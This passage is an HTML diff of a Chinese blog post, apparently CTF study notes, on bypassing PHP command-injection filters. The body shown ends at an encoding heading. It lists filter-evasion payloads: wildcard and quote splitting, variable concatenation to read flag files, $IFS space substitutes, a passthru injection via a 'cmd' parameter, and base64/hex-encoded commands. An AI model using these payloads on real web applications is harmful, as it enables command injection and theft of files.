@@ -1,0 +1,492 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>php命令执行 | txfmk</title><meta name="keywords" content="php特性,web"><meta name="author" content="txfmk"><meta name="copyright" content="txfmk"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="php命令执行"><meta name="application-name" content="php命令执行"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="php命令执行"><meta property="og:url" content="http://example.com/2025/04/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html"><meta property="og:site_name" content="txfmk"><meta property="og:description" content="1.通配符？绕过*1234通配符是一种特殊语句，主要有问号(？)和星号(*)，用来模糊搜索文件。?:在linux里面可以进行代替字母。？仅代表单个字符串，但此单字必须存在。*:在linux里面可以进行模糊匹配。*可以代表任何字符串。    2.单引号、双引号绕过1空字符    3.反斜杠  \"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/1743829693941.jpg"><meta property="article:author" content="txfmk"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/1743829693941.jpg"><meta name="description" content="1.通配符？绕过*1234通配符是一种特殊语句，主要有问号(？)和星号(*)，用来模糊搜索文件。?:在linux里面可以进行代替字母。？仅代表单个字符串，但此单字必须存在。*:在linux里面可以进行模糊匹配。*可以代表任何字符串。    2.单引号、双引号绕过1空字符    3.反斜杠  \"><link rel="shortcut icon" href="/%5Cimages%5C20240925013511498.jpg"><link rel="canonical" href="http://example.com/2025/04/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><link rel="preconnect" href="//cdn.smartcis.cn"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.smartcis.cn/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.smartcis.cn/npm/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: undefined,
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: {"skills":null},
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: txfmk","link":"链接: ","source":"来源: txfmk","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.smartcis.cn/npm/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.smartcis.cn/npm/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'txfmk',
+  title: 'php命令执行',
+  postAI: '',
+  pageFillDescription: '1.通配符？绕过*, 2.单引号、双引号绕过, 3.反斜杠  \    绕过, *4.特殊变量：$1 到$9、$@和$等, 5.内联执行, 6.利用linux中的环境变量, 绕过空格过滤的方法, 读取文件, 长度过滤绕过, gt符号和gtgt符号, 命令换行, ls-t命令, dir及*和rev, dir, *, rev, 长度限制为7的绕过, 长度限制为5的绕过, 长度为4的绕过, 无参数命令执行, 1.请求头绕过(PHP7.3), HTTP请求标头, apache_request_headers(), 利用全局变量进RCE(php5/7), get_defined_vars(), 利用session(php5), session_start(), 使用scandir()进行文件读取, 无字母数字运算绕过, 异或运算通配符绕过通配符是一种特殊语句主要有问号和星号用来模糊搜索文件在里面可以进行代替字母仅代表单个字符串但此单字必须存在在里面可以进行模糊匹配可以代表任何字符串单引号双引号绕过空字符反斜杠绕过把特殊字符去掉功能性单纯表示为字符串特殊变量到和等输出为空内联执行自定义字符串再拼接起来表示利用中的环境变量使用环境变量里的字符执行变量绕过空格过滤的方法改成加其他数字貌似都行用逗号实现了空格功能需要用括起来表示也可以用读取文件反向显示一页一页的显示档案内容与类似查看末尾几行显示的时候顺便输出行号以二进制的方式读取档案内容读取二进制文件主要用于排序文件报告或删除文件中重复的行报错出具体内容在文本中查找指定的字符串编码绕过绕过利用管道输出符将前面的当作后面的参数来执行命令编码道理一样需要来解码编码道理一样不需要来解码只需要即可长度过滤绕过符号和符号通过来创建文件创建文件并把字符串写入到文件里通过来将命令执行结果写入文件会覆盖掉文件原本的内容通过来追加内容在原本文件内容后面追加命令换行在没有写完的命令后面可以将一条命令写在多行命令文件默认排序优先级是符号数字字母而可以将文件名按照时间顺序排列出来后创建的排在前面只能够精确到秒组合运用命令列出文件名然后每个文件名按行储存在创建文件时加入把命令连接起来前面的把后面的实体化变成字符有空格使用双引号包裹可以使用文件来执行也可以执行命令是命令语言解释器执行命令从标准输入读取或从一个文件中读取对命令长度有限制时把一些很短的文件名拼接成可执行命令创建很短的文件名按时间顺序列出文件名按行储存连接换行命令从文件中读取命令及和基本上和一样但有两个好处一是开头字母是这使得它在序中靠前二是按列输出不换行相等于如果第一个文件名是命令的话就会执行命令返回执行的结果之后的文件名作为参数传入可以反转文件每一行内容长度限制为的绕过目标是利用和符号还有符号来构造来反弹到来得到长度限制为的绕过无法使用命令需要重新构造命令需要使用追加符号创建文件将追加到里面然后使用来执行而且只能有一个空格文件我们需要使用在中打开服务并且创建文件来用于反弹内容使用命令来获取并利用管道输出符来执行从而拿到得到长度为的绕过利用追加符号构造也不可以需要重新构造利用和和来构造有一个问题按照字母排序但是顺序不满足所以我们可以在前面加反转后为不影响命令的执行但是可以改变排序此时我们可将内容传输到一个文件使用将内容放到里面然后可以利用和来把里面内容反转先创建一个的目录然后使用来执行得到反转后的文件并放在里面无参数命令执行请求头绕过请求标头获取所有请求标头倒着获取用包裹可以只获取第一个请求头即获取的最后一个用作用和相反功能与相似适用于服务器利用全局变量进返回所有已定义变量的值所组成的数组返回数组顺序为利用函数来读取变量利用符号加入自己想要执行的命令利用和来获取想要执行的命令最后执行即可利用启动新会话或者重用现有会话成功开始会话返回反之返回通过命令可以读取所以我们可以通过修改来执行命令然后我们可以通过来读取将修改为文件名来读取我们也能使用来执行命令不过貌似因为中不可以有空格然后我们需要绕过我试了几种绕过目前只有这种可行当然我们也可以通过命令进行编码来执行命令使用进行文件读取只能文件读取类似在某文件路径下把内容以列表形式显示出来一列出指定路径中的文件和目录一取得当前工作目录一返回数组中的当前值一返回单元顺序相反的数组一交换数组中的键和值一将数组中的内部指针向前移动一从数组中随机取出一个或多个随机键一系统调用函数同用于改变当前工作目录一用于反转给定的字符串一用来来加密目前平台上加密的方法大致有一把希伯来文本从右至左的流转换为左至右的流无字母数字运算绕过异或运算通过异或来构造绕过过滤可以使用来拼接来执行命令可以使用来执行命令不过没有回显我们可以通过反弹来拿到',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-04-05 21:26:09',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/font.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/20241230025422596.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.smartcis.cn/npm/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.smartcis.cn/npm/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">txfmk</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/hexo/" style="font-size: 1.05rem;">hexo<sup>1</sup></a><a href="/tags/jQuery/" style="font-size: 1.05rem;">jQuery<sup>1</sup></a><a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">php反序列化<sup>1</sup></a><a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 1.05rem;">php特性<sup>2</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>3</sup></a><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>1</sup></a><a href="/tags/%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81/" style="font-size: 1.05rem;">表单验证<sup>1</sup></a><a href="/tags/%E8%A1%A8%E6%A0%BC/" style="font-size: 1.05rem;">表格<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/04/"><span class="card-archive-list-date">四月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/wep/" itemprop="url">wep</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/php%E7%89%B9%E6%80%A7/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>php特性</span></a><a class="article-meta__tags" href="/tags/web/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>web</span></a></span></div></div><h1 class="post-title" itemprop="name headline">php命令执行</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-04-05T13:22:49.920Z" title="发表于 2025-04-05 21:22:49">2025-04-05</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-04-05T13:26:09.178Z" title="更新于 2025-04-05 21:26:09">2025-04-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为湖南"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>湖南</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/1743829693941.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2025/04/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><header><a class="post-meta-categories" href="/categories/wep/" itemprop="url">wep</a><a href="/tags/php%E7%89%B9%E6%80%A7/" tabindex="-1" itemprop="url">php特性</a><a href="/tags/web/" tabindex="-1" itemprop="url">web</a><h1 id="CrawlerTitle" itemprop="name headline">php命令执行</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">txfmk</span><time itemprop="dateCreated datePublished" datetime="2025-04-05T13:22:49.920Z" title="发表于 2025-04-05 21:22:49">2025-04-05</time><time itemprop="dateCreated datePublished" datetime="2025-04-05T13:26:09.178Z" title="更新于 2025-04-05 21:26:09">2025-04-05</time></header><h4 id="1-通配符？绕过"><a href="#1-通配符？绕过" class="headerlink" title="1.通配符？绕过*"></a>1.通配符？<em>绕过</em>*</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通配符是一种特殊语句，主要有问号(？)和星号(*)，用来模糊搜索文件。</span><br><span class="line"></span><br><span class="line">?:在linux里面可以进行代替字母。？仅代表单个字符串，但此单字必须存在。</span><br><span class="line">*:在linux里面可以进行模糊匹配。*可以代表任何字符串。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-单引号、双引号绕过"><a href="#2-单引号、双引号绕过" class="headerlink" title="2.单引号、双引号绕过"></a><strong>2.单引号、双引号绕过</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空字符</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-反斜杠-绕过"><a href="#3-反斜杠-绕过" class="headerlink" title="3.反斜杠  \    绕过"></a>3.反斜杠  \    绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把特殊字符去掉功能性，单纯表示为字符串</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-特殊变量：-1-到-9、-和-等"><a href="#4-特殊变量：-1-到-9、-和-等" class="headerlink" title="*4.特殊变量：$1 到$9、$@和$等"></a>*<em>4.特殊变量：$1 到$9、$@和$<em>等</em></em></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出为空</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-内联执行"><a href="#5-内联执行" class="headerlink" title="5.内联执行"></a><strong>5.内联执行</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">自定义字符串，再拼接起来</span><br><span class="line">a=f;d=ag;c=l;cat aScSd.txt</span><br><span class="line">表示cat flag.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="6-利用linux中的环境变量"><a href="#6-利用linux中的环境变量" class="headerlink" title="6.利用linux中的环境变量"></a><strong>6.利用linux中的环境变</strong>量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用环境变量里的字符执行变量</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250208211333083.png" alt="image-20250208211333083"></p>
+<h3 id="绕过空格过滤的方法"><a href="#绕过空格过滤的方法" class="headerlink" title="绕过空格过滤的方法"></a>绕过空格过滤的方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;$9</span><br><span class="line">&#123;IFS&#125;</span><br><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.tac:反向显示；</span><br><span class="line">2.more:一页一页的显示档案内容；</span><br><span class="line">3.less:与more类似；</span><br><span class="line">4.tail:查看末尾几行；</span><br><span class="line">5.nl:显示的时候，顺便输出行号：</span><br><span class="line">6.od:以二进制的方式读取档案内容；(?cmd=passthru(&quot;od -A d-c fla\g.ph\p&quot;);)</span><br><span class="line">7.xxd:读取二进制文件：</span><br><span class="line">8.sort:主要用于排序文件；</span><br><span class="line">9.uniq:报告或删除文件中重复的行；</span><br><span class="line">10.file-f:报错出具体内容；</span><br><span class="line">11.grep:在文本中查找指定的字符串；</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>编码绕过</p>
+<p>base64绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用管道输出符，将前面的当作后面的参数来执行命令</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250211210203365.png" alt="image-20250211210203365"></p>
+<p>hex编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">道理一样，需要(xxd -r -p)来解码</span><br></pre></td></tr></table></figure>
+
+<p>shellcode编码</p>
